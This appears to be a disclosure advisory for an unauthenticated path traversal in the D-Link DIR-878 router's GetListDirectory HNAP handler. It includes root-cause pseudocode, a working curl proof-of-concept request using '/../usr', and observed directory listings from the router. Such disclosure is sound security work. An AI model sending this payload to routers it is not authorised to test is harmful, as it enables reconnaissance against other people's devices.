# D-Link DIR-878 GetListDirectory Pre-authentication Path Traversal (Directory Enumeration)

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

A path traversal vulnerability was discovered in D-Link DIR-878 (REV A) firmware v1.20B05. The
`GetListDirectory` HNAP handler in `bin/prog.cgi` concatenates the user-controlled
`ListDirectoryPath` field with `snprintf("/mnt%s")` and passes it directly to `opendir()`. The
supposed validation function (`FUN_00493134`) contains **no `..` or absolute-path check at all** —
it is merely an `opendir`+`readdir` entry counter. A request with `ListDirectoryPath=/../usr`
escapes the `/mnt` sandbox and enumerates the first-level subdirectory names of `/usr`. The issue
is reachable **without any credentials** (verified: no Cookie, no HNAP_AUTH).

## Affected Product

- Vendor: D-Link
- Product: DIR-878, Hardware Revision A
- Firmware: v1.20B05 (verified). The product is EoL/EoS; later v1.30B08 hotfix builds share the
  same HNAP codebase lineage but were not individually re-verified.

## Vulnerability Details

- Type: Path Traversal — CWE-22, leading to Information Disclosure — CWE-200
- Component: `bin/prog.cgi`, `GetListDirectory` handler at 0x4934fc; "validation" helper at
  0x493134

### Root Cause

```c
/* GetListDirectory handler */
char path[...];
snprintf(path, sizeof(path), "/mnt%s", ListDirectoryPath);   /* attacker-controlled suffix */
...
FUN_00493134(path);   /* looks like validation, but only counts entries:
                         opendir(path); while (readdir(...)) n++;  — no ".." filtering */
opendir(path);        /* traversed path used directly */
```

Only a non-empty `ListDirectoryPath` is required to reach the traversal path (an empty value
selects the `/tmp/usbdisk*` enumeration branch instead). There is no format or legitimacy check
on the field.

## Proof of Concept (non-destructive)

```bash
curl -s -X POST 'http://<router>/HNAP1/?GetCAPTCHAsetting' \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetListDirectory"' \
  -H 'Content-Type: text/xml' \
  --data-binary '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetListDirectory xmlns="http://purenetworks.com/HNAP1/"><ListDirectoryPath>/../usr</ListDirectoryPath></GetListDirectory></soap:Body></soap:Envelope>'
```

Differential matrix (no credentials sent at all):

| ListDirectoryPath | HTTP | Response highlights | Interpretation |
|---|---|---|---|
| `/` (baseline = /mnt/) | 200 | `GetListDirectoryResult>OK`, empty DirectoryList | baseline |
| `/../usr` | 200 | returns `local, lib, codepages, sbin, bin` | **escaped /mnt, enumerated /usr** |
| `/../var` | 200 | returns `tmp, run, web, private` | same for /var |

The returned names match the actual rootfs `/usr` subdirectory listing exactly
(bin, codepages, lib, local, sbin). The process stays alive throughout — pure information
disclosure, no memory corruption.

**Cleanup:** none required; read-only operation, nothing written.

## Impact

- Attacker profile: unauthenticated, adjacent network.
- Proven impact: enumeration of first-level **directory names** under arbitrary paths outside
  `/mnt`, e.g. confirming the presence of `/tmp/usbdisk*`, configuration directories, mount
  points — reconnaissance value for staging further attacks.
- Limitations (stated honestly): cannot read file contents; cannot list regular files (only
  directory entries with d_type = DT_DIR are returned); only one level deep per request.

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` — **3.5** (Low)

Scored on the proven impact: pre-authentication disclosure of directory names only.

## Discovery

Discovered by Zimo-666 on 2026-10-12 via static reverse engineering (the "validation" function
proven to be a mere counter) plus dynamic differential testing in a qemu-user rehosting
environment.
Vendor notified: pending.

---

## Repository files

| File | Content |
|---|---|
| `README.md` | This advisory |
| `poc.sh` | Non-destructive reproduction script, derived from the request recorded above |

> The script reproduces the HTTP request documented in this advisory. It is not a substitute for
> the recorded test evidence; the observed outputs quoted above are the evidence.
